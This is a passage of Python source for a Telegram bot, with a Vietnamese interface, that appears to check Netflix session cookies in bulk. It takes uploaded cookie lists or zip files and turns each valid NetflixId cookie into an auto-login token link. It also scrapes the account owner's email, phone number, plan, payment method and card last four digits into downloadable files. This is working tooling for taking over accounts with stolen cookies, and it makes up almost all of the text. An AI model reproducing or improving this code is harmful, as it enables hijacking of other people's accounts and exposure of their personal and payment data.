            if val and isinstance(val, str) and info['video_quality'] == 'N/A':
                info['video_quality'] = val
                break

        # ── Max streams ──
        for key in ['maxStreams', 'numOfDevices', 'concurrentStreams']:
            val = found.get(key)
            if val and info['max_streams'] == 'N/A':
                info['max_streams'] = str(val)
                break

        # ── Extra member ──
        for key in ['extraMemberSlots', 'extraMembers']:
            val = found.get(key)
            if val is not None and info['extra_member'] == 'N/A':
                if isinstance(val, (int, float)):
                    info['extra_member_slots'] = str(int(val))
                    info['extra_member'] = 'Có' if int(val) > 0 else 'Không'
                elif isinstance(val, str) and val.isdigit():
                    info['extra_member_slots'] = val
                    info['extra_member'] = 'Có' if int(val) > 0 else 'Không'
                break

        # ── Payment on hold ──
        for key in ['isOnHold', 'paymentOnHold', 'onHold']:
            val = found.get(key)
            if val is not None and info['payment_on_hold'] == 'N/A':
                if isinstance(val, bool):
                    info['payment_on_hold'] = 'Có' if val else 'Không'
                elif isinstance(val, str):
                    info['payment_on_hold'] = 'Có' if val.lower() in ('true', 'yes', '1') else 'Không'
                break

        # ── Profiles ──
        for key in ['profiles', 'allProfiles']:
            val = found.get(key)
            if val and isinstance(val, list) and not info['profiles']:
                pnames = []
                for p in val:
                    if isinstance(p, dict):
                        name = (p.get('profileName') or p.get('name') or
                                p.get('firstName') or p.get('rawFirstName'))
                        if name:
                            pnames.append(str(name))
                    elif isinstance(p, str):
                        pnames.append(p)
                if pnames:
                    info['profiles'] = list(dict.fromkeys(pnames))
                    info['profile_count'] = str(len(info['profiles']))
                break

    def _scrape_account_regex(self, html: str, info: dict):
        """Fallback: regex scrape from raw HTML for any remaining N/A fields."""
        if not html or len(html) < 100:
            return

        # ── Email ──
        if info['email'] == 'N/A':
            m = re.search(r'"(?:emailAddress|email|userEmail)"\s*:\s*"([^"]+@[^"]+)"', html)
            if m:
                info['email'] = m.group(1)
                info['email_masked'] = self._mask_email(m.group(1))

        # ── Account name ──
        if info['account_name'] == 'N/A':
            m = re.search(r'"(?:firstName|displayName|accountName)"\s*:\s*"([^"]{1,50})"', html)
            if m:
                info['account_name'] = m.group(1)

        # ── Phone ──
        if info['phone'] == 'N/A':
            m = re.search(r'"(?:phoneNumber|phone|mobileNumber|contactPhoneNumber|formattedPhoneNumber|telephoneNumber)"\s*:\s*"([^"]+)"', html)
            if m:
                info['phone'] = m.group(1)
        # Broader phone pattern: look for international numbers in JSON values
        if info['phone'] == 'N/A':
            m = re.search(r'"(?:phone|mobile|tel|contact)\w*"\s*:\s*"(\+?\d[\d\s\-()]{6,18})"', html, re.I)
            if m:
                info['phone'] = m.group(1).strip()

        # ── Plan name ──
        if info['plan'] == 'N/A':
            m = re.search(r'"(?:localizedPlanName|planName)"\s*:\s*"([^"]+)"', html)
            if m:
                info['plan'] = m.group(1)
            else:
                for label in ['Premium', 'Standard with ads', 'Standard',
                              'Basic with ads', 'Basic', 'Mobile']:
                    if label in html:
                        info['plan'] = label
                        break

        # ── Plan price ──
        if info['plan_price'] == 'N/A':
            m = re.search(r'"(?:formattedPrice|planPrice|retailPrice|localizedPrice)"\s*:\s*"([^"]+)"', html)
            if m:
                info['plan_price'] = m.group(1)

        # ── Member since ──
        if info['member_since'] == 'N/A':
            m = re.search(r'"(?:memberSince|membershipStartDate|createdDate)"\s*:\s*"?(\d{10,13}|[^",}]+)"?', html)
            if m:
                info['member_since'] = self._format_timestamp(m.group(1).strip('"'))

        # ── Next billing ──
        if info['next_billing'] == 'N/A':
            m = re.search(r'"(?:nextBillingDate|nextRenewalDate|renewalDate)"\s*:\s*"?(\d{10,13}|[^",}]+)"?', html)
            if m:
                info['next_billing'] = self._format_timestamp(m.group(1).strip('"'))

        # ── Payment method ──
        if info['payment_method'] == 'N/A':
            m = re.search(r'"(?:paymentType|paymentMethod|mopType)"\s*:\s*"([^"]+)"', html)
            if m:
                info['payment_method'] = m.group(1)

        # ── Card type ──
        if info['cc_type'] == 'N/A':
            m = re.search(r'"(?:cardType|cardIssuer|issuer|cardBrand|mopName|mopDisplayName|cardNetwork)"\s*:\s*"([^"]+)"', html)
            if m:
                info['cc_type'] = m.group(1)

        # ── Last 4 ──
        if info['last4'] == 'N/A':
            m = re.search(r'"(?:lastFourDigits|last4|accountLast4|cardLastFourDigits|mopLastFour|lastDigits|last4Digits)"\s*:\s*"?(\d{4})"?', html)
            if m:
                info['last4'] = m.group(1)

        # ── Membership status ──
        if info['membership_status'] == 'N/A':
            if 'CURRENT_MEMBER' in html:
                info['membership_status'] = 'CURRENT_MEMBER'
            elif 'FORMER_MEMBER' in html:
                info['membership_status'] = 'FORMER_MEMBER'
            elif 'ON HOLD' in html or 'ON_HOLD' in html:
                info['membership_status'] = 'ON HOLD'

        # ── Payment on hold ──
        if info['payment_on_hold'] == 'N/A':
            info['payment_on_hold'] = 'Có' if (
                'ON_HOLD' in html or '"onHold":true' in html or '"isOnHold":true' in html
            ) else 'Không'

        # ── Max streams ──
        if info['max_streams'] == 'N/A':
            m = re.search(r'"(?:maxStreams|numOfDevices|concurrentStreams)"\s*:\s*(\d+)', html)
            if m:
                info['max_streams'] = m.group(1)

        # ── Video quality ──
        if info['video_quality'] == 'N/A':
            m = re.search(r'"(?:videoQuality|planVideoQuality|maxResolution)"\s*:\s*"([^"]+)"', html)
            if m:
                info['video_quality'] = m.group(1)

        # ── Extra member ──
        if info['extra_member'] == 'N/A':
            m = re.search(r'"extraMemberSlots"\s*:\s*(\d+)', html)
            if m:
                slots = int(m.group(1))
                info['extra_member_slots'] = str(slots)
                info['extra_member'] = 'Có' if slots > 0 else 'Không'

        # ── Profiles ──
        if not info['profiles']:
            profs = re.findall(r'"(?:profileName|rawFirstName)"\s*:\s*"([^"]+)"', html)
            if profs:
                seen = list(dict.fromkeys(profs))
                info['profiles'] = seen
                info['profile_count'] = str(len(seen))

        # ── Country fallback from HTML ──
        if info['country'] == 'N/A':
            # Match both "CA" and locale "en-CA" / "en_CA"
            m = re.search(r'"(?:countryOfSignup|currentCountry|signupCountry)"\s*:\s*"([^"]+)"', html)
            if m:
                cc = self._normalize_country_code(m.group(1))
                if cc:
                    info['country'] = cc
                    info['country_currency'] = self._get_country_currency(cc)

    def get_account_info(self, cookie_dict: Dict[str, str]) -> Dict[str, str]:
        """Get comprehensive Netflix account info using multiple API methods."""
        info = {
            'account_name': 'N/A', 'email': 'N/A', 'email_masked': 'N/A',
            'phone': 'N/A', 'country': 'N/A', 'country_currency': '',
            'membership_status': 'N/A', 'plan': 'N/A', 'plan_price': 'N/A',
            'member_since': 'N/A', 'next_billing': 'N/A', 'payment_method': 'N/A',
            'cc_type': 'N/A', 'last4': 'N/A', 'payment_on_hold': 'N/A',
            'video_quality': 'N/A', 'max_streams': 'N/A', 'extra_member': 'N/A',
            'extra_member_slots': 'N/A', 'profile_count': 'N/A', 'profiles': [],
        }
        try:
            cookie_str = self.build_cookie_string(cookie_dict)
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Cookie': cookie_str,
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
            }
            build_id = None
            auth_url = None
            all_html = ''

            # ══════════════════════════════════════════
            #  STEP 1: Fetch Netflix pages → extract reactContext JSON
            # ══════════════════════════════════════════
            target_urls = [
                'https://www.netflix.com/YourAccount',
                'https://www.netflix.com/browse',
                'https://www.netflix.com/account/membership',
                'https://www.netflix.com/account',
            ]

            for url in target_urls:
                try:
                    res = self.session.get(url, headers=headers, timeout=15, allow_redirects=True)
                    if res.status_code != 200:
                        continue

                    html = res.text
                    all_html += html

                    # Extract BUILD_IDENTIFIER
                    if not build_id:
                        build_id = self._extract_build_id(html)

                    # Extract authURL
                    if not auth_url:
                        auth_url = self._extract_auth_url(html)

                    # Parse reactContext JSON — primary data source
                    ctx = self._parse_react_context(html)
                    if ctx:
                        self._parse_account_from_context(ctx, info)

                    # Also try all embedded JSON blobs in script tags
                    json_blobs = re.findall(
                        r'<script[^>]*>\s*(?:window\.\w+\s*=\s*|var\s+\w+\s*=\s*|netflix\.\w+\s*=\s*)({.+?});\s*</script>',
                        html, re.DOTALL
                    )
                    for blob in json_blobs:
                        parsed = self._decode_netflix_json(blob)
                        if parsed and isinstance(parsed, dict):
                            self._parse_account_from_context(parsed, info)

                except Exception as e:
                    logger.debug(f"Failed to fetch {url}: {e}")
                    continue

            # ══════════════════════════════════════════
            #  STEP 2: Shakti API (if BUILD_IDENTIFIER found)
            # ══════════════════════════════════════════
            if build_id:
                shakti_headers = {
                    'User-Agent': headers['User-Agent'],
                    'Accept': 'application/json, text/javascript, */*',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Cookie': cookie_str,
                    'X-Netflix-Client-Platform': 'browser',
                    'Connection': 'keep-alive',
                }

                # ── Profiles API ──
                try:
                    profiles_url = f'https://www.netflix.com/api/shakti/{build_id}/profiles'
                    pres = self.session.get(profiles_url, headers=shakti_headers, timeout=10)
                    if pres.status_code == 200:
                        pdata = pres.json()
                        pnames = []
                        prof_list = pdata if isinstance(pdata, list) else (
                            pdata.get('profiles') or pdata.get('allProfiles') or []
                        )
                        for p in prof_list:
                            if isinstance(p, dict):
                                name = (p.get('profileName') or p.get('firstName')
                                        or p.get('rawFirstName'))
                                if name:
                                    pnames.append(str(name))
                        if pnames and not info['profiles']:
                            info['profiles'] = list(dict.fromkeys(pnames))
                            info['profile_count'] = str(len(info['profiles']))
                except Exception as e:
                    logger.debug(f"Shakti profiles failed: {e}")

                # ── PathEvaluator API — account/billing details ──
                try:
                    path_url = f'https://www.netflix.com/api/shakti/{build_id}/pathEvaluator'
                    pe_params = {
                        'paths': json.dumps([
                            ["billing", "currentPlan", "planName"],
                            ["billing", "currentPlan", "localizedPlanName"],
                            ["billing", "currentPlan", "retailPrice"],
                            ["billing", "currentPlan", "formattedPrice"],
                            ["billing", "currentPlan", "videoQuality"],
                            ["billing", "currentPlan", "maxStreams"],
                            ["billing", "currentPlan", "extraMemberSlots"],
                            ["billing", "nextBillingDate"],
                            ["billing", "currentPaymentMethod", "type"],
                            ["billing", "currentPaymentMethod", "cardType"],
                            ["billing", "currentPaymentMethod", "cardBrand"],
                            ["billing", "currentPaymentMethod", "mopName"],
                            ["billing", "currentPaymentMethod", "mopDisplayName"],
                            ["billing", "currentPaymentMethod", "lastFourDigits"],
                            ["billing", "currentPaymentMethod", "last4"],
                            ["billing", "currentPaymentMethod", "cardLastFourDigits"],
                            ["billing", "currentPaymentMethod", "displayName"],
                            ["membershipStatus"],
                            ["countryOfSignup"],
                            ["userInfo", "firstName"],
                            ["userInfo", "emailAddress"],
                            ["userInfo", "phoneNumber"],
                            ["userInfo", "contactPhoneNumber"],
                            ["userInfo", "memberSince"],
                        ]),
                        'falcorFormat': 'JSON',
                    }
                    if auth_url:
                        pe_params['authURL'] = auth_url

                    pe_res = self.session.get(
                        path_url, params=pe_params,
                        headers=shakti_headers, timeout=10
                    )
                    if pe_res.status_code == 200:
                        pe_data = pe_res.json()
                        # Handle Falcor jsonGraph wrapper
                        if 'jsonGraph' in pe_data:
                            pe_data = pe_data['jsonGraph']
                        self._parse_account_from_context(pe_data, info)
                except Exception as e:
                    logger.debug(f"Shakti pathEvaluator failed: {e}")

            # ══════════════════════════════════════════
            #  STEP 3: Fallback regex scrape on all collected HTML
            # ══════════════════════════════════════════
            self._scrape_account_regex(all_html, info)

            # Do not use the proxy/IP geolocation as the account country.
            # It describes the request location, not the account's country.

            # ══════════════════════════════════════════
            #  STEP 5: Derive missing fields from known data
            # ══════════════════════════════════════════
            # Email masking
            if info['email'] != 'N/A' and info['email_masked'] == 'N/A':
                info['email_masked'] = self._mask_email(info['email'])

            # Derive video quality from plan name
            if info['video_quality'] == 'N/A' and info['plan'] != 'N/A':
                plan_lower = info['plan'].lower()
                if 'premium' in plan_lower:
                    info['video_quality'] = '4K + HDR'
                elif 'standard' in plan_lower:
                    info['video_quality'] = '1080p (Full HD)'
                elif 'basic' in plan_lower:
                    info['video_quality'] = '720p (HD)'
                elif 'mobile' in plan_lower:
                    info['video_quality'] = '480p (SD)'

            # Derive max_streams from plan
            if info['max_streams'] == 'N/A' and info['plan'] != 'N/A':
                plan_lower = info['plan'].lower()
                if 'premium' in plan_lower:
                    info['max_streams'] = '4'
                elif 'standard' in plan_lower:
                    info['max_streams'] = '2'
                elif 'basic' in plan_lower or 'mobile' in plan_lower:
                    info['max_streams'] = '1'

            # Derive extra_member from plan
            if info['extra_member'] == 'N/A' and info['plan'] != 'N/A':
                plan_lower = info['plan'].lower()
                if 'premium' in plan_lower or ('standard' in plan_lower and 'ads' not in plan_lower):
                    info['extra_member'] = 'Có'
                else:
                    info['extra_member'] = 'Không'

            # Default payment_on_hold to Không if still N/A
            if info['payment_on_hold'] == 'N/A':
                info['payment_on_hold'] = 'Không'

            # Derive cc_type from payment_method
            if info['cc_type'] == 'N/A' and info['payment_method'] != 'N/A':
                pm = info['payment_method'].upper()
                cc_map = {
                    'CC': 'Credit Card', 'CREDIT_CARD': 'Credit Card',
                    'CREDITCARD': 'Credit Card', 'DCB': 'Nhà mạng (DCB)',
                    'PAYPAL': 'PayPal', 'GIFT': 'Gift Card',
                    'GIFTCARD': 'Gift Card', 'ITUNES': 'iTunes',
                    'GOOGLEPLAY': 'Google Play', 'AMEX': 'Amex',
                }
                info['cc_type'] = cc_map.get(pm, info['payment_method'])

            # Default phone to explicit empty marker
            # (keep N/A so format_account_card replaces it)

        except Exception as e:
            logger.error(f"get_account_info error: {e}")

        return info

    def check_cookie(self, cookie_dict: Dict[str, str]) -> Tuple[bool, Optional[str], Optional[str], Dict[str, str]]:
        if 'NetflixId' not in cookie_dict:
            return False, None, "Thieu NetflixId", {}

        cookie_str = self.build_cookie_string(cookie_dict)
        last_error = "Loi khong xac dinh"

        endpoint_order = list(range(len(API_ENDPOINTS)))
        if self.last_working_endpoint > 0:
            endpoint_order.remove(self.last_working_endpoint)
            endpoint_order.insert(0, self.last_working_endpoint)

        query_order = list(range(len(QUERY_CONFIGS)))
        if self.last_working_query > 0:
            query_order.remove(self.last_working_query)
            query_order.insert(0, self.last_working_query)

        for ei in endpoint_order:
            api_url = API_ENDPOINTS[ei]
            for qi in query_order:
                payload = QUERY_CONFIGS[qi]
                try:
                    attempt_headers = self._get_headers(cookie_str)
                    response = self.session.post(
                        api_url, headers=attempt_headers, json=payload, timeout=REQUEST_TIMEOUT
                    )
                    if response.status_code == 200:
                        data = response.json()
                        token = None
                        if data and isinstance(data, dict) and isinstance(data.get('data'), dict):
                            token = data['data'].get('createAutoLoginToken')
                        if isinstance(token, str) and token.strip():
                            self.last_working_endpoint = ei
                            self.last_working_query = qi
                            account_info = self.get_account_info(cookie_dict)
                            return True, token, None, account_info
                        elif 'errors' in data:
                            errors = data.get('errors', [])
                            if errors:
                                err_type = errors[0].get('extensions', {}).get('errorType', '')
                                if err_type == 'PERMISSION_DENIED':
                                    last_error = "Cookie het han hoac khong hop le"
                                    break
                                else:
                                    last_error = f"{err_type}"
                        else:
                            last_error = "Phan hoi API khong hop le"
                    elif response.status_code == 401:
                        last_error = "Cookie het han (401)"
                        break
                    elif response.status_code == 403:
                        last_error = "Bi chan truy cap (403)"
                    else:
                        last_error = f"HTTP {response.status_code}"
                except requests.exceptions.Timeout:
                    last_error = "Het thoi gian cho"
                except requests.exceptions.ConnectionError:
                    last_error = "Loi ket noi"
                except Exception as e:
                    last_error = str(e)[:50]
                time.sleep(0.3)

            if "het han" in last_error.lower() or "PERMISSION" in last_error:
                break

        return False, None, last_error, {}

    def format_nftoken_link(self, token: str) -> str:
        return f"https://netflix.com/?nftoken={quote(str(token), safe='')}"


# ══════════════════════════════════════════
#  INITIALIZE
# ══════════════════════════════════════════
checker = NetflixTokenChecker()


# ══════════════════════════════════════════
#  KEYBOARD LAYOUTS
# ══════════════════════════════════════════
def kb_main():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔍 Kiểm tra Cookie", callback_data='menu_chk'),
         InlineKeyboardButton("📁 Hàng loạt", callback_data='menu_batch')],
        [InlineKeyboardButton("📊 Thống kê", callback_data='menu_stats')],
        [InlineKeyboardButton("ℹ️ Hướng dẫn", callback_data='menu_help')],
    ])

def kb_back():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("◀️ Quay lại", callback_data='back_main')]
    ])

def kb_cancel():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⏹ Dừng lại", callback_data='cancel_task')]
    ])

def kb_done():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔍 Kiểm tiếp", callback_data='menu_chk'),
         InlineKeyboardButton("◀️ Menu", callback_data='back_main')]
    ])

# ══════════════════════════════════════════
#  COMMAND HANDLERS
# ══════════════════════════════════════════
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    name = user.first_name if user else "bạn"

    await update.message.reply_text(
        banner_main(name),
        parse_mode='Markdown',
        reply_markup=kb_main()
    )


# ══════════════════════════════════════════
#  BUTTON HANDLER
# ══════════════════════════════════════════
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user = update.effective_user
    name = user.first_name if user else "bạn"

    # ── MENU: Check single cookie ──
    if query.data == 'menu_chk':
        text = (
            f"{LOGO}  ›  *Kiểm tra Cookie*\n"
            f"{DIVIDER}\n\n"
            f"📋 Gửi cookie Netflix của bạn.\n"
            f"Chỉ cần chứa *NetflixId* là đủ.\n\n"
            f"📌 *Định dạng hỗ trợ:*\n"
            f"  • `NetflixId=xxx...`\n"
            f"  • Token thô `v%3D...`\n"
            f"  • Netscape / Header format\n"
            f"  • Kèm SecureNetflixId _(tốt hơn)_\n\n"
            f"{DIVIDER_THIN}\n"
            f"{FOOTER}"
        )
        await query.edit_message_text(text, parse_mode='Markdown', reply_markup=kb_back())
        context.user_data['awaiting'] = 'cookie'

    # ── MENU: Batch check ──
    elif query.data == 'menu_batch':
        text = (
            f"{LOGO}  ›  *Kiểm tra hàng loạt*\n"
            f"{DIVIDER}\n\n"
            f"📁 Tải lên file chứa cookie:\n\n"
            f"  • File `.txt` — mỗi dòng 1 cookie\n"
            f"  • File `.zip` — chứa nhiều file .txt\n\n"
            f"⚡ Bot sẽ tự động kiểm tra từng\n"
            f"   cookie và trả kết quả chi tiết.\n\n"
            f"📏 Giới hạn: *{MAX_FILE_SIZE // 1024 // 1024}MB*\n\n"
            f"{DIVIDER_THIN}\n"
            f"{FOOTER}"
        )
        await query.edit_message_text(text, parse_mode='Markdown', reply_markup=kb_back())
        context.user_data['awaiting'] = 'file'

    # ── MENU: Stats ──
    elif query.data == 'menu_stats':
        uid = update.effective_user.id if update.effective_user else 0
        stats = get_user_stats(uid)
        total = stats['total']
        success = stats['success']
        rate = round(success / total * 100, 1) if total > 0 else 0

        ep_host = API_ENDPOINTS[checker.last_working_endpoint].split('//')[1].split('/')[0]

        text = (
            f"{LOGO}  ›  *Thống kê*\n"
            f"{DIVIDER}\n\n"
            f"  👤 *{name}*\n\n"
            f"  📋 Đã kiểm tra:     *{total}*\n"
            f"  ✅ Thành công:       *{success}*\n"
            f"  📈 Tỷ lệ:               *{rate}%*\n\n"
            f"  {DIVIDER_THIN}\n\n"
            f"  🔗 Endpoint:  `{ep_host}`\n"
            f"  📡 Endpoints:  *{len(API_ENDPOINTS)}*\n"
            f"  🔄 Configs:      *{len(QUERY_CONFIGS)}*\n"
            f"  🌐 Proxy:        Tắt — kết nối trực tiếp\n\n"
            f"  {DIVIDER_THIN}\n"
            f"  {FOOTER}"
        )
        await query.edit_message_text(text, parse_mode='Markdown', reply_markup=kb_back())

    # ── MENU: Help ──
    elif query.data == 'menu_help':
        text = (
            f"{LOGO}  ›  *Hướng dẫn*\n"
            f"{DIVIDER}\n\n"
            f"*1. Kiểm tra Cookie:*\n"
            f"   Gửi cookie Netflix → nhận link\n"
            f"   đăng nhập nhanh (NFToken).\n\n"
            f"*2. Hàng loạt:*\n"
            f"   Upload file .txt/.zip chứa nhiều\n"
            f"   cookie, bot check tự động.\n\n"
            f"*3. Thống kê:*\n"
            f"   Xem lịch sử kiểm tra của bạn.\n\n"
            f"  {DIVIDER_THIN}\n\n"
            f"💡 *Mẹo:* Cookie có cả\n"
            f"   `SecureNetflixId` sẽ cho kết quả\n"
            f"   chính xác hơn.\n\n"
            f"  {DIVIDER_THIN}\n"
            f"  {FOOTER}"
        )
        await query.edit_message_text(text, parse_mode='Markdown', reply_markup=kb_back())

    # ── Cancel ──
    elif query.data == 'cancel_task':
        chat_id = update.effective_chat.id
        if chat_id in active_tasks:
            active_tasks[chat_id] = True
            await query.edit_message_text(
                f"{banner_result_fail()}\n  ⏹ Đã dừng tác vụ.\n\n  {DIVIDER_THIN}\n  {FOOTER}",
                parse_mode='Markdown'
            )
        else:
            await query.answer("Không có tác vụ nào đang chạy")

    # ── Back to main ──
    elif query.data == 'back_main':
        await query.edit_message_text(
            banner_main(name),
            parse_mode='Markdown',
            reply_markup=kb_main()
        )
        context.user_data['awaiting'] = None


# ══════════════════════════════════════════
#  MESSAGE HANDLERS
# ══════════════════════════════════════════
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text or ''
    awaiting = context.user_data.get('awaiting')
    user_id = update.effective_user.id if update.effective_user else 0

    def send_no_action_reply():
        return update.message.reply_text(
            f"{banner_result_fail()}\n"
            f"  Hiện tại bot đang chờ thao tác.\n"
            f"  Hãy mở menu và chọn *Kiểm tra Cookie* hoặc *Hàng loạt*.\n\n"
            f"  {DIVIDER_THIN}\n"
            f"  {FOOTER}",
            parse_mode='Markdown',
            reply_markup=kb_main()
        )

    # ── Fallback: if user sends a cookie without selecting menu first ──
    if not awaiting:
        cookies_list = checker.extract_cookies_from_text(text)
        if cookies_list:
            awaiting = 'cookie'
            context.user_data['awaiting'] = 'cookie'
        else:
            await send_no_action_reply()
            return

    # ── Single cookie check ──
    if awaiting == 'cookie':
        await update.message.chat.send_action(action="typing")

        cookies_list = checker.extract_cookies_from_text(text)
        if not cookies_list:
            fail_text = (
                f"{banner_result_fail()}\n"
                f"  Không tìm thấy *NetflixId*\n"
                f"  trong dữ liệu bạn gửi.\n\n"
                f"  Hãy kiểm tra lại cookie.\n\n"
                f"  {DIVIDER_THIN}\n"
                f"  {FOOTER}"
            )
            await update.message.reply_text(fail_text, parse_mode='Markdown', reply_markup=kb_done())
            context.user_data['awaiting'] = None
            return

        cookie_dict = cookies_list[0]

        status_msg = await update.message.reply_text(
            f"⏳ *Đang kiểm tra...*\n\n  Thử kết nối tới Netflix API...\n\n  {DIVIDER_THIN}\n  {FOOTER}",
            parse_mode='Markdown',
            reply_markup=kb_cancel()
        )

        chat_id = update.effective_chat.id
        active_tasks[chat_id] = False

        success, token, error, account = await asyncio.to_thread(
            checker.check_cookie, cookie_dict
        )
        update_stats(user_id, total=1, success=1 if success else 0)

        if active_tasks.get(chat_id, False):
            active_tasks.pop(chat_id, None)
            context.user_data['awaiting'] = None
            return
        active_tasks.pop(chat_id, None)

        if success and token:
            link = checker.format_nftoken_link(token)
            card = format_account_card(account, link)
            await status_msg.edit_text(card, parse_mode='Markdown', disable_web_page_preview=True)

            # Build filename
            email = account.get('email', 'NoEmail')
            email_clean = re.sub(r'[^\w\-_]', '', email.split('@')[0]) if email != 'N/A' and '@' in email else 'NoEmail'
            plan_clean = re.sub(r'[^\w\-_]', '', account.get('plan', 'NoPlan').replace(' ', '_'))
            country_clean = re.sub(r'[^\w\-_]', '', account.get('country', 'XX'))
            filename = f"NF_{email_clean}_{plan_clean}_{country_clean}.txt"

            file_content = (
                f"# ══════════════════════════════════════\n"
                f"#  NETFLIX COOKIE + NFTOKEN\n"
                f"#  Generated by {BOT_NAME} v{BOT_VERSION}\n"
                f"#  {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"# ══════════════════════════════════════\n"
                f"#\n"
                f"# Email:      {account.get('email', 'N/A')}\n"
                f"# Plan:       {account.get('plan', 'N/A')}\n"
                f"# Country:    {account.get('country', 'N/A')}\n"
                f"# Payment:    {account.get('payment_method', 'N/A')}\n"
                f"# CC Type:    {account.get('cc_type', 'N/A')}\n"
                f"# Streams:    {account.get('max_streams', 'N/A')}\n"
                f"# Quality:    {account.get('video_quality', 'N/A')}\n"
                f"# Status:     {account.get('membership_status', 'N/A')}\n"
                f"# Extra:      {account.get('extra_member_slots', 'N/A')}\n"
                f"#\n"
                f"# NFToken:    {token}\n"
                f"# Login:      {link}\n"
                f"#\n"
                f"# ══════════════════════════════════════\n\n"
                f"{checker.build_netscape_format(cookie_dict)}"
            )

            await update.message.reply_document(
                document=io.BytesIO(file_content.encode()),
                filename=filename,
                caption=f"📄 {filename}"
            )
        else:
            fail_text = (
                f"{banner_result_fail()}\n"
                f"  *Lý do:*  `{error}`\n\n"
                f"  💡 Cookie có thể đã hết hạn\n"
                f"  hoặc tài khoản bị khóa.\n\n"
                f"  {DIVIDER_THIN}\n"
                f"  {FOOTER}"
            )
            await status_msg.edit_text(fail_text, parse_mode='Markdown')

        context.user_data['awaiting'] = None
        await update.message.reply_text("⬇️", reply_markup=kb_done())


# ══════════════════════════════════════════
#  FILE HANDLER (BATCH)
# ══════════════════════════════════════════
async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting') == 'file':
        await update.message.reply_text(
            f"❌ Hãy chọn *Hàng loạt* từ menu trước.\n\n  {FOOTER}",
            parse_mode='Markdown', reply_markup=kb_done()
        )
        return

    context.user_data['awaiting'] = None
    file = await update.message.document.get_file()
    user_id = update.effective_user.id if update.effective_user else 0

    if (file.file_size or 0) > MAX_FILE_SIZE:
        await update.message.reply_text(
            f"❌ File quá lớn. Tối đa *{MAX_FILE_SIZE // 1024 // 1024}MB*",
            parse_mode='Markdown', reply_markup=kb_done()
        )
        return

    await update.message.chat.send_action(action="typing")

    file_content_buf = io.BytesIO()
    await file.download_to_memory(file_content_buf)
    file_content_buf.seek(0)

    filename = (update.message.document.file_name or '').lower()
    all_cookies = []

    status_msg = await update.message.reply_text(
        f"⏳ *Đang đọc file...*\n\n  {FOOTER}",
        parse_mode='Markdown',
        reply_markup=kb_cancel()
    )

    chat_id = update.effective_chat.id
    active_tasks[chat_id] = False

    try:
        if filename.endswith('.zip'):
            with zipfile.ZipFile(file_content_buf) as zip_file:
                infos = [info for info in zip_file.infolist() if not info.is_dir()]
                if len(infos) > MAX_ZIP_ENTRIES:
                    raise ValueError(f'ZIP vượt quá {MAX_ZIP_ENTRIES} file')
                if sum(info.file_size for info in infos) > MAX_ZIP_UNCOMPRESSED_SIZE:
                    raise ValueError('ZIP vượt quá dung lượng giải nén cho phép')
                txt_files = [info.filename for info in infos if info.filename.lower().endswith('.txt')]
                for txt_file in txt_files:
                    if active_tasks.get(chat_id, False):
                        await status_msg.edit_text(
                            f"⏹ *Đã dừng*\n\n  {FOOTER}",
                            parse_mode='Markdown'
                        )
                        active_tasks.pop(chat_id, None)
                        return
                    with zip_file.open(txt_file) as f:
                        content = f.read().decode('utf-8', errors='ignore')
                        cookies = checker.extract_cookies_from_text(content)
                        all_cookies.extend(cookies)

        elif filename.endswith('.txt'):
            content = file_content_buf.read().decode('utf-8', errors='ignore')
            cookies = checker.extract_cookies_from_text(content)
            all_cookies = cookies
        else:
            await status_msg.edit_text(
                f"❌ Chỉ hỗ trợ `.txt` và `.zip`\n\n  {FOOTER}",
                parse_mode='Markdown', reply_markup=kb_done()
            )
            active_tasks.pop(chat_id, None)
            return

        unique_cookies = {}
        for cookie in all_cookies:
            key = (cookie.get('NetflixId', ''), cookie.get('SecureNetflixId', ''))
            if key[0]:
                unique_cookies[key] = cookie
        all_cookies = list(unique_cookies.values())

        if len(all_cookies) > MAX_BATCH_COOKIES:
            await status_msg.edit_text(
                f"❌ Batch vượt quá giới hạn {MAX_BATCH_COOKIES} cookie.",
                reply_markup=kb_done()
            )
            active_tasks.pop(chat_id, None)
            return

        if not all_cookies:
            await status_msg.edit_text(
                f"❌ Không tìm thấy cookie hợp lệ.\n  Cần có *NetflixId* trong file.\n\n  {FOOTER}",
                parse_mode='Markdown', reply_markup=kb_done()
            )
            active_tasks.pop(chat_id, None)
            return

        # Progress
        await status_msg.edit_text(
            progress_bar(0, len(all_cookies), 0),
            parse_mode='Markdown',
            reply_markup=kb_cancel()
        )

        results = []
        success_count = 0

        for i, cookie_dict in enumerate(all_cookies, 1):
            if active_tasks.get(chat_id, False):
                await status_msg.edit_text(
                    f"⏹ *Đã dừng tại {i-1}/{len(all_cookies)}*\n\n  ✅ Thành công: *{success_count}*\n\n  {FOOTER}",
                    parse_mode='Markdown'
                )
                active_tasks.pop(chat_id, None)
                return

            success, token, error, account = await asyncio.to_thread(
                checker.check_cookie, cookie_dict
            )

            if success and token:
                results.append({
                    'cookies': cookie_dict,
                    'token': token,
                    'link': checker.format_nftoken_link(token),
                    'account': account
                })
                success_count += 1

            if i % 2 == 0 or i == len(all_cookies):
                try:
                    await status_msg.edit_text(
                        progress_bar(i, len(all_cookies), success_count),
                        parse_mode='Markdown',
                        reply_markup=kb_cancel()
                    )
                except:
                    pass

        active_tasks.pop(chat_id, None)
        update_stats(user_id, total=len(all_cookies), success=success_count)

        # Summary
        await status_msg.edit_text(
